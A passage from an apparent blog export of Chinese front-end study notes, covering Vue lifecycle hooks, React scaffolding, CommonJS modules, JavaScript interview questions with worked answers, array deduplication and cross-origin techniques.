4、接下来开始render，渲染出真实dom，然后执行mounted钩子函数，此时，组件已经出现在页面中，数据、真实dom都已经处理好了,事件都已经挂载好了，可以在这里操作真实dom等事情… 5、当组件或实例的数据更改之后，会立即执行beforeUpdate，然后vue的虚拟dom机制会重新构建虚拟dom与上一次的虚拟dom树利用diff算法进行对比之后重新渲染，一般不做什么事儿 6、当更新完成后，执行updated，数据已经更改完成，dom也重新render完成，可以操作更新后的虚拟dom 7、当经过某种途径调用$destroy方法后，立即执行beforeDestroy，一般在这里做一些善后工作，例如清除计时器、清除非指令绑定的事件等等 8、组件的数据绑定、监听…去掉后只剩下dom空壳，这个时候，执行destroyed，在这里做善后工作也可以 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt; &lt;meta http-equiv="X-UA-Compatible" content="ie=edge"&gt; &lt;title&gt;Document&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;div id="app"&gt; &lt;aaa&gt;&lt;/aaa&gt; &lt;/div&gt; &lt;template id="aaa"&gt; &lt;div&gt; &lt;p class="myp"&gt;A组件&lt;/p&gt; &lt;button @click="destroy"&gt;destroy&lt;/button&gt; &lt;input type="text" v-model="msg"&gt; &lt;p&gt;msg:&#123;&#123;msg&#125;&#125;&lt;/p&gt; &lt;/div&gt; &lt;/template&gt;&lt;/body&gt;&lt;script src="./vue.js"&gt;&lt;/script&gt;&lt;script&gt; //生命周期：初始化阶段 运行中阶段 销毁阶段 Vue.component("aaa",&#123; template:"#aaa", data:function()&#123; return &#123;msg:'hello'&#125; &#125;, timer:null, methods:&#123; destroy:function()&#123; this.$destroy()// &#125; &#125;, beforeCreate:function()&#123; console.log('beforeCreate:刚刚new Vue()之后，这个时候，数据还没有挂载呢，只是一个空壳') console.log(this.msg)//undefined console.log(document.getElementsByClassName("myp")[0])//undefined &#125;, created:function()&#123; console.log('created:这个时候已经可以使用到数据，也可以更改数据,在这里更改数据不会触发updated函数') this.msg+='!!!' console.log('在这里可以在渲染前倒数第二次更改数据的机会，不会触发其他的钩子函数，一般可以在这里做初始数据的获取') console.log('接下来开始找实例或者组件对应的模板，编译模板为虚拟dom放入到render函数中准备渲染') &#125;, beforeMount:function()&#123; console.log('beforeMount：虚拟dom已经创建完成，马上就要渲染,在这里也可以更改数据，不会触发updated') this.msg+='@@@@' console.log('在这里可以在渲染前最后一次更改数据的机会，不会触发其他的钩子函数，一般可以在这里做初始数据的获取') console.log(document.getElementsByClassName("myp")[0])//undefined console.log('接下来开始render，渲染出真实dom') &#125;, // render:function(createElement)&#123; // console.log('render') // return createElement('div','hahaha') // &#125;, mounted:function()&#123; console.log('mounted：此时，组件已经出现在页面中，数据、真实dom都已经处理好了,事件都已经挂载好了') console.log(document.getElementsByClassName("myp")[0]) console.log('可以在这里操作真实dom等事情...') // this.$options.timer = setInterval(function () &#123; // console.log('setInterval') // this.msg+='!' // &#125;.bind(this),500) &#125;, beforeUpdate:function()&#123; //这里不能更改数据，否则会陷入死循环 console.log('beforeUpdate:重新渲染之前触发') console.log('然后vue的虚拟dom机制会重新构建虚拟dom与上一次的虚拟dom树利用diff算法进行对比之后重新渲染') &#125;, updated:function()&#123; //这里不能更改数据，否则会陷入死循环 console.log('updated:数据已经更改完成，dom也重新render完成') &#125;, beforeDestroy:function()&#123; console.log('beforeDestory:销毁前执行（$destroy方法被调用的时候就会执行）,一般在这里善后:清除计时器、清除非指令绑定的事件等等...') // clearInterval(this.$options.timer) &#125;, destroyed:function()&#123; console.log('destroyed:组件的数据绑定、监听...都去掉了,只剩下dom空壳，这里也可以善后') &#125; &#125;) new Vue(&#123; &#125;).$mount('#app')&lt;/script&gt;&lt;/html&gt;]]></content>
      <categories>
        <category>Vue</category>
      </categories>
      <tags>
        <tag>Vue学习笔记</tag>
        <tag>生命周期</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[react学习笔记(一)]]></title>
    <url>%2F2018%2F09%2F04%2Freact%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E4%B8%80)%2F</url>
    <content type="text"><![CDATA[React 是Facebook公司研发的一款JS框架(MVC) React的脚手架React是一款框架：具备自己开发的独立思想(MVC：model view controller) 划分组件开发 基于路由的SPA单页面开发 基于ES6来编写代码(最后部署上线的时候,我们需要把ES6编译成ES5=&gt;基于babel来完成编译) 可能用到less或者sass等，我们也需要使用对应的插件，把他们进行预编译 最后为了优化性能(减少http的请求次数)，我们需要把JS或者CSS进行合并压缩 webpack来完成以上页面组件合并、JS/CSS编译加合并等工作 前端工程化开发： 基于框架的组件化开发 基于webpack的自动部署 但是配置webpack是一个相对复杂的工作，我们需要自己安装很多的包，还需要自己写相对复杂的 配置文件。。。，如果我们有一个插件， 基于它可以快速构建一套完整的自动化工程项目结构，那么有助于提高开发效率=&gt;”脚手架” Vue中的脚手架：vue-cliReact的脚手架：create-react-APP]]></content>
      <categories>
        <category>react</category>
      </categories>
      <tags>
        <tag>react</tag>
        <tag>初步</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[react脚手架初步学习]]></title>
    <url>%2F2018%2F09%2F04%2Freact%E8%84%9A%E6%89%8B%E6%9E%B6%E5%88%9D%E6%AD%A5%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[react基础react起源于Facebook的内部项目，因为该公司对市场上所有JavaScript MVC框架，都不满意，就决定自己写一套，用来架设Instagram的网站，做出来以后，发现这套东西很好用，就在2013年5月开源了. MVC(Model View Controller)由数据控制视图的渲染 create-react-app npm i create-react-app -g create-react-app + 项目名称 注意：npm和yarn最好不要混用，否则发送丢包或者混乱的状况 yarn start 开发环境下yarn build 项目上线打包 =&gt; buildyarn eject]]></content>
      <categories>
        <category>react</category>
      </categories>
      <tags>
        <tag>react</tag>
        <tag>初步学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[node-CommonJS规范]]></title>
    <url>%2F2018%2F09%2F04%2Fnode-CommonJS%E8%A7%84%E8%8C%83%2F</url>
    <content type="text"><![CDATA[node-初级玩家node本身是基于commonJS模块规范设计的，所以模块是node的组成 内置模块：node天生提供给JS调取使用的 第三方模块：别人写好的，我们可以基于npm安装使用 自定义模块：自己创建的一些模块 commonJS模块设计的思想(AMD/CMD/ES6 module都是模块化设计思想) 123456789101112131415161.commonJS规定：每一个JS都是一个单独的模块(模块是私有的，里面涉及的值和变量以及函数等都是私有的，和其他的JS文件中的内容是不冲突的)2.commonJS中可以允许模块中的方法相互的调用B模块中想要调取A模块中的方法=&gt; A导出=&gt; B导入[导出]commonJS给每一个模块(每个JS)中都设置了内置的变量/属性/方法module:代表当前这个模块对象[object]module.exports:模块的这个属性是用来导出当前属性和方法的[object]exports:是内置的一个`变量`,也是用来导出当前模块属性方法的,虽然和module.exports不是一个东西，但是对应的值是同一个(module.exports=exports值都是对象)[导入]require:commonJS提供的内置变量,用来导入模块的(其实导入的就是module.exports暴露出来的东西;导入的值也是[object]类型的;) temp1: 12345let a = 12, fn = b=&gt;&#123; return a*b; &#125;;exports.fn = fn;//=&gt;把当前模块私有的函数 temp2: 12345let a = 13, fn = b=&gt;&#123; return a/b; &#125;;let temp1 = require('./temp1');//=&gt;特意指定是当前目录中的某个模块(.js可以省略)require导入的时候，首先把temp1模块中的JS自上而下执行，把exports对应的堆内存导入进来，所以接收到的结果是一个对象(require是一个同步操作：只有把导入的模块代码执行完成，才可以获取值，然后继续执行本模块下面的代码)]]></content>
      <categories>
        <category>node</category>
      </categories>
      <tags>
        <tag>node</tag>
        <tag>commonJS规范</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[week1面试题整理]]></title>
    <url>%2F2018%2F09%2F04%2Fweek1%E9%9D%A2%E8%AF%95%E9%A2%98%E6%95%B4%E7%90%86%2F</url>
    <content type="text"><![CDATA[第一题123456789101112131415161718192021222324252627282930313233343536setTimeout(function() &#123; console.log('start'); //第二步,打印'start' new Promise(function(resolve, reject) &#123; resolve(true); //执行then中的resolve方法 reject(false); //状态凝固了不执行 console.log(1); //prmise类是同步的,第三步打印1 &#125;).then(function() &#123; setTimeout('var x=2;console.log(2);'); //放入宏任务中 console.log(a); //a未定义会报错,then中返回的promise实例，执行reject方法 &#125;, function() &#123; setTimeout('var x=3;console.log(3)'); console.log(b); &#125;).then(function() &#123; console.log(4); &#125;, function() &#123; console.log(5); //a报错之后执行，第四步打印5 &#125;).catch(function() &#123; console.log(6); &#125;)&#125;, 0)setTimeout(function() &#123; const timer = setInterval(function() &#123; console.log(7); //放入宏任务中 &#125;, 10) const start = Date.now(); setTimeout(function() &#123; //放入宏任务中 while (Date.now() - start &lt;= 30) &#123;&#125; clearTimeout(timer); try &#123; console.log(x); &#125; catch (e) &#123; console.log(8); &#125; &#125;, 13)&#125;, 0)console.log('end'); //第一步,打印'end' 题解： 1、首先两个定时器都放入宏任务中，先执行主任务中的代码，打印’end’ 2、此时主任务队列任务执行完成去执行第一个宏任务,先执行同步代码，打印’start’ 3、随之执行promise类中的代码,打印’1’,执行resolve,由于这个时候状态改变了，所以不会执行reject方法，跳过 4、执行resolve之后，执行第一个then中的第一个回调函数，遇到setTimeout放入宏任务中,在打印a的时候由于a未定义会报错， 5、在第四步中a报错之后，触发reject方法，执行第二个then中第二个回调函数捕获错误,打印’5’,由于then中存在第二个回调函数，因此 不会走catch，如果传递下来then没有第二个回调，才会走catch方法 6、第一个宏任务走完之后，走第二个宏任务，遇到两个定时器，也都放入宏任务中，现在我们一共剩下三个宏任务(第四步一个和这里两个),我们来看着三个宏任务是怎么执行的。 7、setTimeout(‘var x=2;console.log(2);’);分在浏览器环境还是node环境中,首先setTimeout是可以传字符串的，但是不推荐。 在浏览器环境下解析该字符串，相当于eval函数，解析完成之后，其变量会暴露在当前作用域中，由于回调中的作用域是全局(this指向window),因此x=2暴露在全局作用域下，会打印2, 如果在node环境中，这段字符串是不会解析的，直接跳过这行代码，继续执行下面的宏任务 8、再执行setInterval打印7, 9、剩下最后一个宏任务,首先这里用到了一个知识点,用while阻塞了主线程,如果是在浏览器环境下，由于第七步将x=2暴露在了全局下，所以这里不会报错,将2打印出来。如果是在node环境中，由于setTimeout(‘var x=2;console.log(2);’)这行代码不走，打印x就会报错，catch捕获异常后打印出8 最后总结：输出结果是浏览器：’end’、’start’、1、5、2、7、2node环境：’end’、’start’、1、5、7、8知识点：如果有两个宏任务，一个宏任务先执行的话，先执行完第一个宏任务中的微任务，再去执行宏任务。while可以阻塞主线程：通过时间戳来控制阻塞时间。 第二题12345678910111213141516+function() &#123; alert(a); //a&#123;2&#125; a(); //2 var a = function() &#123; console.log(1); &#125; function a() &#123; console.log(2); &#125; alert(a); //a&#123;1&#125; a(); //1 var c = d = a;&#125;()alert(d);alert(c); 题解： 外面是一个自执行函数，进入之后先进行变量提升，函数的提升会提升到顶部，然后再是变量a的提升 1、函数是声明+定义;变量只声明不定义,函数提升之后，变量a不会再声明;第一句alert(a),是打印函数体function(){console.log(2)} 2、a()执行时，打印2 3、执行到第二个alert之后，a已经被重新赋值了，覆盖掉之前的函数体，这个时候弹出的是函数体function(){console.log(1)} 4、执行a(),打印1 5、var c = d = a;执行这句的时候，c是带var的,b没有带var,b给全局增加属性，c是私有变量 6、在外面打印的时候d弹出函数体a、c会报错 第三题123456789101112131415161718function Foo() &#123; getName = function() &#123; console.log(1); &#125;; return this;&#125;Foo.getName = function() &#123; console.log(2); &#125;;Foo.prototype.getName = function() &#123; console.log(3); &#125;;var getName = function() &#123; console.log(4); &#125;;function getName() &#123; console.log(5); &#125;//请写出以下输出结果：Foo.getName(); //2getName(); //4Foo().getName(); //1getName(); //1new Foo.getName(); //2new Foo().getName(); //3new new Foo().getName(); //3 题解： Foo.getName()执行的是Foo上的私有方法 打印的是2 getName()执行的是window下的，这个时候getName是var getName = function() { console.log(4); }; 打印的是4 Foo().getName();当Foo执行之后，window下的getName被修改为getName = function() { console.log(1); }; 打印的是1 getName();再执行的时候，window下的getName还是getName = function() { console.log(1); }; 打印的是1 new Foo.getName();点的优先级高，先是访问Foo私有属性上的getName再new 打印的是2 new Foo().getName();这个时候先new Foo()所以是Foo的实例去调用，原型上的getName方法 打印的是3 new new Foo().getName();先执行new Foo()实例去调用原型上的getName方法，再new 打印的是3 第四题12345678910111213141516171819function teacher(name, age) &#123; this.name = name; this.age = age;&#125;teacher.prototype.sayName = function() &#123; console.log('name' + this.name);&#125;teacher.prototype.sayAge = function() &#123; console.log('age' + this.age);&#125;function student() &#123; var args = arguments; teacher.call(this, args[0], args[1])&#125;student.prototype = new teacher();var student1 = new student('zhufeng', 8);student1.sayName(); //'name' + zhufengstudent1.sayAge(); //'age' + 8 题解： student.prototype = new teacher()这个时候student的原型称为了teacher的实例，就可以通过student.prototype.proto找到teacher原型上的sayName和sayAge方法 student1是student的实例，通过proto找到student的原型，student的原型再通过proto去找到teacher原型上的sayName和sayAge方法 第五题12//对下列数组进行排序let arr = ["五", "二", "六", "一", "四", "三"]; 方法一： 123456789101112var obj = &#123; '一': 1, '二': 2, '三': 3, '四': 4, '五': 5, '六': 6&#125;arr.sort(function(a, b) &#123; return obj[a] - obj[b];&#125;)console.log(arr); 方法二： 123456789101112131415arr = arr.reduce(function(prev, next, index) &#123; prev.push(obj[next]); prev = prev.sort(function(a, b) &#123; return a - b; &#125;); if (index === 5) &#123; prev = prev.map(function(item) &#123; for (let key of Object.keys(obj)) &#123; if (obj[key] === item) &#123; return key; &#125; &#125; &#125;) &#125; return prev;&#125;, []);console.log(arr);]]></content>
      <categories>
        <category>面试题</category>
      </categories>
      <tags>
        <tag>面试题</tag>
        <tag>第一周面试题整理</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[数组去重方法汇总]]></title>
    <url>%2F2018%2F09%2F04%2F%E6%95%B0%E7%BB%84%E5%8E%BB%E9%87%8D%E6%96%B9%E6%B3%95%E6%B1%87%E6%80%BB%2F</url>
    <content type="text"><![CDATA[基本方法 思路：创建一个新数组，遍历原数组，若遍历元素在新数组不存在就添加到数组中，反正则忽略12345678910111213141516function uniqeArray(arr)&#123; var res = []; for(var i = 0;i &lt; arr.length;i++)&#123; var repeat = false; for(var j = 0;j &lt; res.length ; j++)&#123; if(arr[i] === res[j])&#123; repeat = true; break; &#125; &#125; if(!repeat)&#123; res.push(arr[i]); &#125; &#125; return res;&#125; 先排序再去重 思路：先对数组排序，再定义一个新的数组，遍历排序后的数组，若排序后的数组元素不等于新数组的最后一个元素，则添加。 12345678910111213function uniqeArray(arr)&#123; function sortNumber(a , b)&#123; return a - b; &#125; var newArr = arr.sort(sortNumber); var res = []; for(var i = 0;i &lt; newArr.length;i++)&#123; if(newArr[i] !== res[res.length - 1])&#123; res.push(newArr[i]); &#125; &#125; return res;&#125; 对象去重 思路：利用对象的属性。遍历数组，若该数组元素不是对象的属性，则添加。 1234567891011function uniqeArray(arr) &#123; var res = []; var temp = &#123;&#125;; for(var i = 0; i&lt; arr.length; i++)&#123; if(!temp[arr[i]])&#123; res.push(arr[i]); temp[arr[i]] = 1; &#125; &#125; return res;&#125; filter、indexOf方法 思路：通过filter筛选出去重后的数组。若indexOf方法在该元素之后再查不到该元素的位置，表示该元素不存在，符合要求。 12345function uniqeArray(arr) &#123; return arr.filter(function (item, index, array) &#123; return array.indexOf(item, index+1) === -1; &#125;)&#125; ES6 Set 思路：利用ES6中Set不包含重复元素的思想，为数组创建set对象，再将set对象转换为数组。 123function uniqeArray(arr) &#123; return Array.from(new Set(arr));&#125;]]></content>
      <categories>
        <category>数组</category>
      </categories>
      <tags>
        <tag>数组</tag>
        <tag>去重</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[week2面试题]]></title>
    <url>%2F2018%2F09%2F03%2Fweek2%E9%9D%A2%E8%AF%95%E9%A2%98%E6%95%B4%E7%90%86%2F</url>
    <content type="text"><![CDATA[题目：请实现方法 parse ，作用如下：1234567891011121314151617181920212223242526272829303132333435var object = &#123; b: &#123; c: 4 &#125;, d: [&#123; e: 5 &#125;, &#123; e: 6 &#125;]&#125;;console.log(parse(object, 'b.c') == 4) //true console.log(parse(object, 'd[0].e') == 5) //trueconsole.log(parse(object, 'd.0.e') == 5) //trueconsole.log(parse(object, 'd[1].e') == 6) //trueconsole.log(parse(object, 'd.1.e') == 6) //trueconsole.log(parse(object, 'f') == 'undefined') //truefunction parse(obj, str) &#123; var arr = str.split(""); //将字符串分割，放进数组中 arr = arr.map(function(item, index) &#123; if (!isNaN(item)) &#123; //判断是否是数字 if (arr[index - 1] != '[' &amp;&amp; arr[index + 1] != ']') &#123; //如果前后没有,则返回[item] return "[" + item + "]"; &#125; else &#123; //如果不是上述情况，则直接返回该项 return item; &#125; &#125; else &#123; //如果不是数字的情况下,.后面是数字,则需要去掉前面的. if (item === "." &amp;&amp; !isNaN(arr[index + 1])) &#123; return ""; &#125; return item; &#125; &#125;) //将数组join方法变成字符串赋值给str str = arr.join(""); //将结果返回 return eval('obj.' + str) || 'undefined';&#125; 题解： 1、首先，我们拿到题的时候，应该分析题目的目的。首先是一个object对象，然后通过parse传参的形式，将对象object和字符串作为参数传进去。返回值是获取object对象属性值，属性值存在的时候返回属性值，不存在的时候返回undefined。 2、获取属性值有两种方式：object[属性名]或者object.属性名，但是属性名是数字的时候只能采用第一种方式。所以我们要对这种情况进行讨论。 3、下面我们要讨论的就是数字这种情况的，分析数字前后有没有[]，如果有，那么我们不需要做什么，直接返回，如果数字前后没有[],那么我们是需要手动给数字前后加上[],并且把前面的’.’去掉。 4、分析好上述情况之后，我们代码实现：首先传入obj,str 4.1、我们将str.split(“”)，放入数组中，然后采用数组的map方法进行遍历，分两种情况，是数字，和不是数字 4.2、是数字中，又分为数字前后有没有[],没有就添加上再返回，有就直接返回 4.3、不是数字的话，如果是’.’,则需要判断’.’后面是否是数字，如果是数字，就返回空字符串 4.4、将map映射后的数组重新赋值给arr，最后用arr.join(“”)拼接之后转字符串再赋值给str 4.5、最后我们需要运算之后，将属性值返回来，字符串的运算，我们采用eval来运算。 题目：请写出如下输出值,并写出把注释掉的代码取消注释的值，并解释为什么？12345678910111213141516this.a = 20; //给window新增一个属性a,并赋给属性值20var test = &#123; a: 40, init: () =&gt; &#123; console.log(this.a); //箭头函数没有this，会向上级作用域找，上级作用域是window，所以这里打印的this.a其实是window.a，打出属性值20 function go() &#123; //this.a = 60; console.log(this.a); //this指向实例,因为是new执行的,原型上有a=50，打印50。如果解开注释的话，自己私有属性有，就找自己私有属性，打印60 &#125; go.prototype.a = 50; return go; &#125;&#125;;//var p = test.init();//p();//这里执行的话，go中的this指向window，new(test.init())(); 我们从上到下一行一行分析： 1、this.a当前作用域是window，所以执行这句话的时候相当于给window新增了键值对a:20 2、再到test是一个对象,有一个init方法，是一个箭头函数，箭头函数中的this会指向window，然后箭头函数中的返回值是一个go函数 3、我们先不看注释掉的代码，看函数怎么执行的，先是new(test.init())()，是new test.init()也就是说是init的返回值new，那么这个时候go就是一个构造函数，init执行的时候打印this.a是20,再new go()的时候，go中的this指向它的实例，this自己没有a属性，找到原型上的a属性，打印50 4、因此，在不看注释的代码，依次打印的是：20、50 5、我们再解开注释代码，用变量p接收test.init()的返回值，也就是把go的空间地址赋值给p了，p()执行的时候，这个时候go中的this会指向window,在go中又修改了this.a的值为60； 6、new(test.init())()执行这句的时候，跟上面第三步的分析一样，只不过这个时候给this新增了私有属性a，就直接打印60 7、因此，在解开注释之后，打印的顺序依次是：20、60、60、60 写出下面程序的输出结果123456var arr1 = "john".split('');//arr1=['j','o','h','n']var arr2 = arr1.reverse();//arr2=arr1=['n','h','o','j']var arr3 = "jones".split('');//arr3=['j','o','n',e','s']arr2.push(arr3);//arr1=arr2=['n','h','o','j',['j','o','n',e','s']]console.log("array 1: length=" + arr1.length + " last=" + arr1.slice(-1));console.log("array 2: length=" + arr2.length + " last=" + arr2.slice(-1)); 题解： 1、arr1 = “john”.split(‘’);分割之后，得到数组：arr1=[‘j’,’o’,’h’,’n’] 2、arr2 = arr1.reverse();由于reverse会改变原数组，将arr1.reverse的返回值给arr2，所以arr2与arr1指向同一个地址；得到：arr2=arr1=[‘n’,’h’,’o’,’j’] 3、arr3 = “jones”.split(‘’);分割之后得到：arr3=[‘j’,’o’,’n’,e’,’s’] 4、arr2.push(arr3);将arr3直接push在末尾，得到：arr1=arr2=[‘n’,’h’,’o’,’j’,[‘j’,’o’,’n’,e’,’s’]] 5、因此打印arr1和arr2的长度是5，slice(-1)截取的时候，是索引为5+(-1)的值[‘j’,’o’,’n’,e’,’s’]，转字符串就是’j’,’o’,’n’,e’,’s’ 写出下列程序的输出结果1234567891011function f1(n) &#123; n = n || 2; return function (x) &#123; return (x * n); &#125;&#125;var f2 = f1();//function(x)&#123;return (x*2)&#125;var f3 = f1(3);//function(x)&#123;return (x*3)&#125;console.log(f2(3));//6console.log(f3(3));//9console.log(f3(f2(3)));//18 什么是跨域？常用的跨域方式有哪些？由于浏览器存在同源策略，请求的 Url 地址的协议、主机名、端口号必须完全相同，否则会产生跨域， 同源策略的限制下 cookie 、loclstorage、dom、ajax、IndexDB 等都不允许跨域、form 表单不受同源策略限制 对跨域的理解有一个误区，跨域不是请求没有发送出去或者服务器接收到请求而没有响应，正确的情况是请求发出，服务器响应，由于响应和请求来自不同的域被浏览器拦截了。 跨域的方式有以下几种： 1、jsonp：通过 script 的 src 属性发送请求，传参必须含有 callback 回调的名称，服务器返回函数的调用，接收到响应直接执行； 2、cors：通过服务端设置 Access-Control-Allow-Origin，通常在后端通过白名单设置权限允许固定的域来访问 3、window.postMessage：H5 API，消息接收方通过 message 事件接收，事件对象 data 属性代表接收的消息，可以通过事件对象的 source 属性 通过 source.postMessage(“message”, e.origin) 进行回复 4、可以使用 window.name 和 location.hash 在不同域的 iframe 页面之间进行消息传递 5、document.domain：如果域名之间是一二级域名的关系，可以将页面的 document.domain 设置为一级域名的后半部分，如：baidu.com 实现跨域 6、可以使用 websocket 进行跨域，websocek 的协议为 ws:// 或 wss:// 是实时通信，不存在跨域问题。 7、服务器与服务器之间通信不受浏览器同源策略限制，因此不存在跨域问题，可以使用 nginx 或 node 的 http-proxy-middleware 中间件实现作为代理服务器帮助浏览器对请求进行转发，完成与不同域的服务器之间的通信，webpack-dev-server 就是通过 http-proxy-middleware 实现的跨域 详情请看：https://www.pandashen.com/2018/06/11/20180611010638/ 性能优化详情见我的博客地址：https://kejinzhu.cn/2018/08/15/web%E5%89%8D%E7%AB%AF%E5%BC%80%E5%8F%91%E5%B8%B8%E7%94%A8%E7%9A%84%E4%BC%98%E5%8C%96%E6%8A%80%E5%B7%A7%E6%B1%87%E6%80%BB/#more]]></content>
      <categories>
        <category>面试题</category>
      </categories>
      <tags>
        <tag>面试题</tag>
        <tag>第二周面试题整理</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Vue中watch和computed的区别]]></title>
    <url>%2F2018%2F09%2F03%2FVue%E4%B8%ADwatch%E5%92%8Ccomputed%E7%9A%84%E5%8C%BA%E5%88%AB%2F</url>
    <content type="text"><![CDATA[computed和watch的区别从属性名上分析 computed是一个计算属性，也就是依赖其他的属性计算所得出最后的值 watch是去监听一个值的变化，然后执行相对应的函数。 从实现上分析： computed的值再getter执行后是会缓存的，知识在它依赖的属性值改变之后，下一次获取computed的值才会重新调用对应的getter来计算;支持缓存 watch在每次监听的值变化时，都会执行回调。不支持缓存。 从场景上分析： 如果一个值依赖多个属性(多对一),用computed肯定是更加方便的 如果一个值变化后会引起一系列操作，或者一个值变化会引起一系列的变化(用watch会更加方便一些) 从计算上分析 computed通常就是简单的计算 watch的回调里面会传入监听属性的新旧值,通过这两个值可以做一些特定的操作。 从数据上分析： computed是用于定义基于数据之上的数据 watch是你想在某个数据变化时做一些事情 注：如果watch是你想在某个数据变化时做的事情是更新其他数据，那其实与把这个要更新的数据项定义成computed是一样的，这个时候用computed更有可读性,虽然在技术上讲watch也可以实现。 从写法上分析： computed的返回是state处理后的结果 watch是赋值行为，修改state 从异步上分析： computed不支持异步 watch支持异步]]></content>
      <categories>
        <category>Vue</category>
      </categories>
      <tags>
        <tag>Vue学习笔记</tag>
        <tag>computed和watch的区别</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ES基础知识与高频考点梳理]]></title>
    <url>%2F2018%2F08%2F31%2FES%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E4%B8%8E%E9%AB%98%E9%A2%91%E8%80%83%E7%82%B9%E6%A2%B3%E7%90%86%2F</url>
    <content type="text"><![CDATA[知识点梳理目录列表 变量类型 JS的数据类型分类和判断 值类型和引用类型 原型与原型链(继承) 原型和原型链的定义 继承写法 作用域和闭包 执行上下文 this 闭包是什么 异步 同步VS异步 异步和单线程 前端异步的场景 ES6/7新标准的考查 箭头函数 module class set和map promise 变量类型JavaScript是一种弱类型脚本语言，所谓弱类型指的是定义变量时，不需要什么类型，在程序运行过程中会自动判断类型 ECMAScript中定义了6种原始类型 boolean string number undefined null symbol 题目：类型判断用到哪些方法？typeoftypeof xxx得到的值有一下类型：undefined、boolean、number、string、object、function、symbol typeof null结果是object，实际这是typeof的一个bug，null是原始值，非引用类型 typeoof [1,2]结果是object，结果中没有这一项，引用类型除了function其他的全部都是object typeof Symbol()用typeof获取symbol类型的值得到的是symbol，这是ES6新增的知识点 instanceof用于实例和构造函数的对应。例如判断一个变量是否是数组，使用typeof无法判断,但可以使用[1,2] instanceof Array来判断。因为,[1,2]是数组,它的构造函数就是Array：同理 12345function Foo(name) &#123; this.name = name&#125;var foo = new Foo('bar')console.log(foo instanceof Foo) // true constructorobject.prototype.toString.call()题目：值类型和引用类型的区别值类型VS引用类型除了原始类型，ES还有引用类型，上文提到的typeof识别出来的类型中,只有object和function是引用类型，其他都是值类型 根据JavaScript中的变量类型传递方式，又分为值类型和引用类型值类型包括：Boolean、string、number、undefined、null;引用类型包括：object类的所有，如Date、Array、function等。在参数传递方式上，值类型是按值传递，引用类型是按地址传递 123456// 值类型var a = 10var b = ab = 20console.log(a) // 10console.log(b) // 20 上述代码中，a b都是值类型，两者分别修改赋值，相互之间没有任何影响。再看引用类型的例子： 1234567// 引用类型var a = &#123;x: 10, y: 20&#125;var b = ab.x = 100b.y = 200console.log(a) // &#123;x: 100, y: 200&#125;console.log(b) // &#123;x: 100, y: 200&#125;... 上述代码中，a b都是引用类型。在执行了b = a之后，修改b的属性值，a的也跟着变化。因为a和b都是引用类型，指向了同一个内存地址，即两者引用的是同一个值，因此b修改属性时，a的值随之改动。再借助题目进一步讲解一下。 题目：说出下面代码的执行结果，并分析其原因。123456789101112function foo(a)&#123; a = a * 10;&#125;function bar(b)&#123; b.value = 'new';&#125;var a = 1;var b = &#123;value: 'old'&#125;;foo(a);bar(b);console.log(a); // 1console.log(b); // value: new... 通过代码执行，会发现： a的值没有发生改变 b的值发生了改变这就是因为Number类型的a是按值传递的，而Object类型的b是按地址传递的。 JS 中这种设计的原因是：按值传递的类型，复制一份存入栈内存，这类类型一般不占用太多内存，而且按值传递保证了其访问速度。按共享传递的类型，是复制其引用，而不是整个复制其值（C 语言中的指针），保证过大的对象等不会因为不停复制内容而造成内存的浪费。… 引用类型经常会在代码中按照下面的写法使用，或者说容易不知不觉中造成错误！ 123456789var obj = &#123; a: 1, b: [1,2,3]&#125;var a = obj.avar b = obj.ba = 2b.push(4)console.log(obj, a, b) 虽然obj本身是个引用类型的变量（对象），但是内部的a和b一个是值类型一个是引用类型，a的赋值不会改变obj.a，但是b的操作却会反映到obj对象上。 原型和原型链JavaScript 是基于原型的语言，原型理解起来非常简单，但却特别重要，下面还是通过题目来理解下JavaScript 的原型概念。 题目：如何理解JavaScript的原型对于这个问题，可以从下面这几个要点来理解和回答，下面几条必须记住并且理解 1.每一个函数数据类型（函数、类）都天生自带一个prototype属性，prototype的属性值是一个对象数据类型的； prototype 属性中天生自带一个constructor属性，属性值是当前原型所属的类； 3.每一个对象数据类型值（对象、数组、arguments…）天生自带一个proto属性，属性值指向当前实例所属类的原型； 4.所有的函数数据类型（普通函数、类（内置的、自定义））都是Function的一个实例；Function是所有函数的基类； 5.所有的对象数据类型（实例、prototype、对象）都是Object的一个实例；Object是所有对象数据类型的基类； 12345678910111213// 要点一：自由扩展属性var obj = &#123;&#125;; obj.a = 100;var arr = []; arr.a = 100;function fn () &#123;&#125;fn.a = 100;// 要点二：__proto__console.log(obj.__proto__);console.log(arr.__proto__);console.log(fn.__proto__);// 要点三：函数有 prototypeconsole.log(fn.prototype)// 要点四：引用类型的 __proto__ 属性值指向它的构造函数的 prototype 属性值console.log(obj.__proto__ === Object.prototype)... 原型123456789101112131415// 构造函数function Foo(name, age) &#123; this.name = name&#125;Foo.prototype.alertName = function () &#123; alert(this.name)&#125;// 创建示例var f = new Foo('zhangsan')f.printName = function () &#123; console.log(this.name)&#125;// 测试f.printName()f.alertName()... 执行printName时很好理解，但是执行alertName时发生了什么？这里再记住一个重点 当试图得到一个对象的某个属性时，如果这个对象本身没有这个属性，那么会去它的proto（即它的构造函数的prototype）中寻找，因此f.alertName就会找到Foo.prototype.alertName。… 那么如何判断这个属性是不是对象本身的属性呢？使用hasOwnProperty，常用的地方是遍历一个对象的时候。 1234567var itemfor (item in f) &#123; // 高级浏览器已经在 for in 中屏蔽了来自原型的属性，但是这里建议大家还是加上这个判断，保证程序的健壮性 if (f.hasOwnProperty(item)) &#123; console.log(item) &#125;&#125;... 题目：如何理解JS的原型链原型链还是接着上面的示例，如果执行f.toString()时，又发生了什么？ 1234// 